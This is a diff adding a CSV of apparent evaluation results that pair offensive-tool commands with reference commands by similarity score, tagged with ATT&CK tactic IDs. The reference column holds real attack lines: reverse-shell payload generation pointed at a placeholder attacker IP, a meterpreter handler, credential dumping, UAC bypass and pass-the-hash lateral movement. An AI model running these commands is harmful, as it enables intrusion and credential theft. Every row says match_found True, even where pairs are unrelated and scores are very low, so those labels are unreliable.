@@ -1,0 +1,29 @@
+file,tool,input_command,matched_command,chrf_score,match_found
+command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",59.855,True
+command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",60.523,True
+command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",64.495,True
+command_metasploit_TA0011_T1071.txt,metasploit,use meterpreter/http,`meterpreter> getsystem -t 1`,51.137,True
+command_metasploit_TA0011_T1071.txt,metasploit,setg HTTPHost <http_host>,`msfvenom -p python/meterpreter/reverse_https LHOST=<attacker IP> LPORT=8443 -o python.py`,14.965,True
+command_metasploit_TA0011_T1071.txt,metasploit,setg HTTPPort <http_port>,`msfvenom -p python/meterpreter/reverse_https LHOST=<attacker IP> LPORT=8443 -o python.py`,14.461,True
+command_metasploit_TA0011_T1071.txt,metasploit,run,[meterpreter\*] > `run post/windows/gather/credentials/credential_collector`,12.449,True
+command_metasploit_TA0011_T1071.txt,metasploit,use meterpreter/dns,`meterpreter> getsystem -t 1`,52.659,True
+command_metasploit_TA0011_T1071.txt,metasploit,setg DNSName <dns_name>,"[meterpreter\*] > `upload SysinternalsSuite.zip ""C:\\Users\\username\\Downloads\\SysinternalsSuite.zip""`",11.494,True
+command_metasploit_TA0011_T1071.txt,metasploit,setg DNSPort <dns_port>," ```
+    set payload windows/x64/meterpreter_reverse_https
+    set lport 80
+    set ExitOnSession False
+    exploit -j
+```",11.499,True
+command_metasploit_TA0011_T1071.txt,metasploit,run,[meterpreter\*] > `run post/windows/gather/credentials/credential_collector`,12.449,True
+command_paexec_TA0003_T1505.txt,paexec,paexec -i -c <web_server_script_name>.bat," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `",15.972,True
+command_plink_TA0001_T1071.txt,plink,plink.exe -no-sanitise-stdout -load <session_name>,`plink.exe <domain_admin>@<bankfileserver_ip>`,24.315,True
+command_plink_TA0001_T1071.txt,plink,plink.exe -no-antispoof <fake_website_url>,`plink.exe <domain_admin>@<bankfileserver_ip>`,25.672,True
+command_plink_TA0001_T1071.txt,plink,plink.exe -share <session_name>,`plink.exe <domain_admin>@<bankfileserver_ip>`,31.53,True
+command_pupy_TA0001_T1078.txt,pupy,creddump,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`",6.33,True
+command_pupy_TA0003_T1078.txt,pupy,run Lazagne,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`",6.349,True
+command_pupy_TA0004_T1078.txt,pupy,creddump,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`",6.33,True
+command_pupy_TA0004_T1078.txt,pupy,bypassuac && getsystem,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`",8.117,True
+command_pupy_TA0004_T1078.txt,pupy,beroot,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`",5.678,True
+command_pupy_TA0004_T1078.txt,pupy,lazagne -o db -p <local_db_path>,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,10.642,True
+command_pupy_TA0004_T1078.txt,pupy,cred -l <local_db_path>,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,9.367,True
+command_pupy_TA0005_T1078.txt,pupy,laze -s,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,4.125,True
